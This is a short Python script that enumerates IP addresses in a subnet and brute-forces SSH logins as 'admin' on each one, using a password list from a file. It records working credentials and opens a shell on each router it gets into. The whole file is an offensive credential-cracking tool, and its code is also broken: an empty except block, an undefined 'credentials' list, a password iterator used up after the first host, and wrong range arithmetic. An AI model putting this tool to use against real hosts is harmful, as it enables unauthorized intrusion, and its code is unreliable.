import re
import time
import paramiko #needs to be imported

#a function to get the network information in ip/cidr_net_mask format and return
#a list with all the ips in the network
def generate_ip_list(ip_mask):

    #split the network and the ip mask
    ip_mask = ip_mask.split("/")
    net = ip_mask[0]
    cidr = int(ip_mask[1])
    net = net.split(".")
    #find the ip range
    net_range = 32 - cidr
    #generate the ips in the network
    ip_list = []
    for i in range(int(net[3])+1,net_range+1):
        ip_list.append(net[0]+"."+net[1]+"."+net[2]+"."+str(i))
    return ip_list

#a function that brute forces every machine to find its password and returns a
# [ip,password] list
def cracker(ip_list):

    pass_file = open("password.txt", 'r')
    pass_list = map(str.rstrip, pass_file.readlines())
    for ip in ip_list:
        for password in pass_list:
            try:
                #Logging into device
                session = paramiko.SSHClient()

        		#For testing purposes, this allows auto-accepting unknown host keys
        		#Do not use in production! The default would be RejectPolicy
                session.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        		#Passing the necessary parameters
                session.connect(ip, username = "admin", password = password)

        		#Start an interactive shell session on the router
                connection = session.invoke_shell()
                #Closing the connection
                session.close()
                credentials.append([ip,password])
                break
            except paramiko.AuthenticationException:

    return credentials
